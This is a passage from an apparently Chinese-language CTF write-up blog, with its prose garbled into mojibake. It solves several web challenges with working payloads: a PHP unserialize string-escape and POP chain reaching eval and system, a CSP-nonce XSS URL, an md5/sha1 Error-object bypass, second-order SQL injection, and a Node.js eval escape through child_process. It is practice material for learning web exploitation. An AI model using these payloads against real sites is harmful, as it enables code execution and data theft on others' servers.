class="variable">$pdata</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line">    <span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data_replace</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é“çš„æ€è·¯å¾ˆç®€å•ï¼Œä¼ å…¥çš„æ˜¯$pdataï¼Œä»–ç›´æ¥åœ¨æºç é‡Œnewäº†ï¼Œåªæœ‰nameæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼ŒåŒæ—¶æˆ‘ä»¬å‘ç°åé¢åˆæœ‰replaceï¼å¯ä»¥è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸äº†ï¼ï¼é‚£å°±å¾ˆç®€å•äº†ï¼ŒæŠŠ$key,$basedataé€ƒé€¸å‡ºæ¥æ”¹å€¼å°±å¯ä»¥ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;s:3:&quot;key&quot;;s:5:&quot;UUCTF&quot;;s:8:&quot;basedata&quot;;N;s:2:&quot;ob&quot;;N;&#125;   53</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UUCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>,<span class="variable">$key</span>,<span class="variable">$basedata</span>,<span class="variable">$ob</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;key===<span class="string">&quot;UUCTF&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;ob=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;basedata));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">output</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">rce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nothing</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">youwant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac flag.php&#x27;);&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pdata</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">UUCTF</span>(<span class="variable">$pdata</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data_replace</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hacker&quot;</span>,<span class="string">&quot;loveuu!&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€ƒé€¸å‡ºkey</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data_replace</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$out</span>=<span class="keyword">new</span> <span class="title function_ invoke__">output</span>();</span><br><span class="line"><span class="variable">$youwant</span>=<span class="keyword">new</span> <span class="title function_ invoke__">youwant</span>();</span><br><span class="line"><span class="variable">$nothing</span>=<span class="keyword">new</span> <span class="title function_ invoke__">nothing</span>();</span><br><span class="line"><span class="variable">$out</span>-&gt;a=<span class="variable">$youwant</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;t=<span class="variable">$out</span>;</span><br><span class="line"><span class="variable">$nothing</span>-&gt;a=&amp;<span class="variable">$nothing</span>-&gt;b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nothing</span>);</span><br></pre></td></tr></table></figure><p>UUCTFä¸­çš„__wakeup()ä¸­ä¹Ÿæœ‰ä¸€ä¸ªunserialize()ï¼Œä¼ å‚basedataï¼Œè¿™é‡Œçš„popé“¾åœ¨ä¸Šé¢ä¹Ÿæœ‰äº†ï¼Œè¦æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯nothingä¸­çš„__wakeup()å’Œ__unserialize()ï¼Œè¿™é‡Œçš„wakeupä¼šæ¸…ç©ºaå±æ€§çš„å€¼ï¼ŒåŒæ—¶æˆ‘ä»¬å‘ç°phpç‰ˆæœ¬åˆä¸ç¬¦åˆé‚£ä¸ªcveï¼Œæˆ‘ä»¬åˆå‘ç°destructä¸­æœ‰å¯¹bå±æ€§çš„èµ‹å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡å¼•ç”¨èµ‹å€¼å°†abè”åˆèµ·æ¥ã€‚è¿™æ ·é—®é¢˜å°±è¿åˆƒè€Œè§£äº†ã€‚</p><h2 id="LitCTF-2023-Http-pro-max-plus"><a href="#LitCTF-2023-Http-pro-max-plus" class="headerlink" title="[LitCTF 2023]Http pro max plus"></a>[LitCTF 2023]Http pro max plus</h2><p>å…³äºhttpåè®®çš„é¢˜ï¼Œæœ‰ä¸€ç‚¹å°ç›²ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://node1.anna.nssctf.cn:28246/ -H â€œclient-ip:127.0.0.1â€ -H â€œReferer:pornhub.comâ€ -H â€œUser-Agent:Chromeâ€ -H â€œVia:Clash.winâ€</span><br></pre></td></tr></table></figure><h2 id="AFCTF-2021-BABY-CSP"><a href="#AFCTF-2021-BABY-CSP" class="headerlink" title="[AFCTF 2021]BABY_CSP"></a>[AFCTF 2021]BABY_CSP</h2><p>å­˜åœ¨CSPç­–ç•¥ï¼Œéœ€è¦ç»•è¿‡ï¼ŒæŠ“åŒ…çœ‹çœ‹</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241213210502761.png" alt="image-20241213210502761"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;none&#x27;;script-src &#x27;nonce-29de6fde0db5686d&#x27;</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹å¦‚ä¸Šï¼Œå…è®¸nonce-29de6fde0db5686d</p><p>é‚£ä¹ˆæ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28378/?school=&lt;script nonce=&quot;29de6fde0db5686d&quot;&gt;alert(flag)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;b4f323f4-020d-4821-bc1a-efd73ce09f89&#125;</span><br></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$str</span>=~(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">1</span>);<span class="variable">$y</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;?&gt;&lt;?=include ~&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;?&gt;&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$a</span>-&gt;syc=<span class="variable">$x</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;lover=<span class="variable">$y</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥ä¸èƒ½`whoami&#96;è¿™æ ·è¾“å‡ºï¼Œå¥‡æ€ª</p><p>é‚£å°±åªèƒ½includeäº†ï¼Œä½†æ˜¯å¼•å·è¢«è¿‡æ»¤ï¼Œä¸¤æ¬¡å–åæ¥ç»•è¿‡ã€‚</p><h2 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h2><p>äºŒæ¬¡æ³¨å…¥åŠ sqliteæ³¨å…¥ï¼Œä¸æ˜¯å¾ˆç†Ÿæ‚‰</p><p>äºŒæ¬¡æ³¨å…¥çš„æ­¥éª¤ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªadminâ€™â€“+è¿›å»ï¼Œå‘ç°æœ‰ä¸ªä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹å¯†ç å¤„å°†adminâ€™â€“+æ”¾è¿›å»ï¼Œé‚£ä¹ˆæ”¹çš„å°±æ˜¯adminçš„å¯†ç ï¼Œç›´æ¥æ‹¿ä¸‹adminï¼Œè¿›å»sqliteæ³¨å…¥å°±è¡Œï¼Œè¿™é‡Œç”¨pythonè„šæœ¬æˆ–è€…sqlmapéƒ½æ˜¯å¯ä»¥çš„ï¼</p><h2 id="GFCTF-2021-ez-calc"><a href="#GFCTF-2021-ez-calc" class="headerlink" title="[GFCTF 2021]ez_calc"></a>[GFCTF 2021]ez_calc</h2><p>f12ç½‘é¡µæºç è¿™ç§å­˜åœ¨è¿™æ ·çš„ä»£ç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() === <span class="string">&#x27;ADMIN&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">passwd</span> === <span class="string">&#x27;admin123&#x27;</span>)&#123;</span><br><span class="line">       <span class="comment">// ç™»å½•æˆåŠŸï¼Œè®¾ç½® session</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œctrl+uæˆ–è€…å³é”®æŸ¥çœ‹ç½‘é¡µæºä»£ç æ˜¯çœ‹ä¸åˆ°è¿™æ®µçš„ã€‚</p><p>è¿™é‡Œé‡‡ç”¨nodejsçš„å¤§å°å†™ç‰¹æ€§æ¥ç»•è¿‡ï¼Œnodejsç¬”è®°é‡Œæœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admÄ±n</span><br></pre></td></tr></table></figure><p>ç™»é™†è¿›å»åæ˜¯ä¸€ä¸ªcalcç•Œé¢ï¼ŒåŒæ ·f12æŸ¥çœ‹æºä»£ç è·å–æºç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.<span class="property">body</span>.<span class="property">calc</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æˆªå–</span></span><br><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//å»ç©º</span></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°æ˜çš„åŒå­¦è¿‡æ»¤äº†ä¸€äº›æ¯”è¾ƒå±é™©çš„ä¸œè¥¿</span></span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216165920626.png" alt="image-20241216165920626"></p><p>è¿™é‡Œå¯ä»¥è°ƒè¯•ä¸€ä¸‹ï¼Œæ–¹ä¾¿çœ‹ï¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216170014770.png" alt="image-20241216170014770"></p><p>æˆ‘ä»¬å‘ç°æ˜¯å¯ä»¥é€ƒé€¸å‡ºæ¥çš„ï¼Œå› ä¸ºå–çš„calc[i]æ˜¯å¤§äºä¸€ä½çš„ï¼Œè€Œ.splitå‡ºæ¥åªæœ‰ä¸€ä½ï¼Œæ‰€ä»¥æ˜¯ä¸ç›¸ç­‰çš„ã€‚å¯ä»¥åˆ©ç”¨æ­¤å¤„çš„æ¼æ´æ¥è¿›è¡Œé€ƒé€¸ã€‚</p><p>è®©è¿™ä¸ªå•ç‹¬çš„ä¸€ä½åœ¨å¾ˆåé¢å°±è¡Œï¼Œå¤§äºè¦é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å³å¯ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216173859525.png" alt="image-20241216173859525" style="zoom: 67%;" /><p>è¿™é‡Œæœ¬æ¥æƒ³ç›´æ¥cat &#x2F;xxxxxx.flagï¼Œä½†æ˜¯å­˜åœ¨é•¿åº¦é™åˆ¶ï¼Œå¤±è´¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br></pre></td></tr></table></figure><p>æƒ³åŠæ³•ï¼Œè¿™é‡Œç”¨æ˜Ÿå·ä¸å¯ä»¥</p><p>åŒæ—¶è¿‡æ»¤äº†xï¼Œä¸èƒ½ç”¨execï¼Œä½†æ˜¯è¿™å¯ä»¥ç»•è¿‡ï¼</p><p>è¿™é‡Œæœ¬æ¥æƒ³ç€ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œä½†æ˜¯ä¸å¯ä»¥ï¼Œå®æµ‹</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216174248130.png" alt="image-20241216174248130"></p><p>æˆ‘æƒ³å¯èƒ½æ˜¯å› ä¸ºå·²ç»åœ¨forå¾ªç¯ä¸­è¢«è§£æå‡ºæ¥äº†ï¼Œå°±å·²ç»æ˜¯xäº†ï¼Œè€Œå¯¹xçš„æ£€æµ‹å†æœ€åï¼Œæ‰€ä»¥æ²¡æ³•ç»•è¿‡</p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ç§æ–¹æ³•ã€‚å› ä¸ºæˆ‘ä»¬é€šè¿‡requireå¯¼å…¥çš„æ¨¡å—æ˜¯ä¸€ä¸ªObjectï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡Object.valuesè·å–åˆ°child_processé‡Œé¢çš„å„ç§æ–¹æ³•ï¼Œé‚£ä¹ˆå†é€šè¿‡æ•°ç»„ä¸‹æ ‡[5]å°±å¯ä»¥å¾—åˆ°execSyncäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$&#123;IFS&#125;/G*&gt;p&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;p&#x27;]).stdout.toString();</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šç”±äºé•¿åº¦é™åˆ¶ï¼Œå› æ­¤åªèƒ½é€šè¿‡å†™æ–‡ä»¶å’Œè¯»æ–‡ä»¶åˆ†ç¦»æ¥è·å–flagäº†ï¼</p><h2 id="CISCN-2019ååŒ—Day1-Web1"><a href="#CISCN-2019ååŒ—Day1-Web1" class="headerlink" title="[CISCN 2019ååŒ—Day1]Web1"></a>[CISCN 2019ååŒ—Day1]Web1</h2><p>æ‰“å¼€åæ˜¯ä¸€ä¸ªæ³¨å†Œ+ç™»å½•ç•Œé¢ï¼Œé‡åˆ°è¿™ç§æƒ…å†µä¸€èˆ¬éƒ½æ˜¯å…ˆæ³¨å†Œå†ç™»é™†è¿›å»çš„ï¼Œæ¥ä¸‹æ¥å¯èƒ½æœ‰æƒé™çš„æå‡ç­‰ç­‰ã€‚</p><p>è¿›å»åå‘ç°ä¸‰ä¸ªåŠŸèƒ½ç‚¹ã€‚</p><ul><li>ä¸Šä¼ æ–‡ä»¶</li><li>ä¸‹è½½æ–‡ä»¶</li><li>åˆ 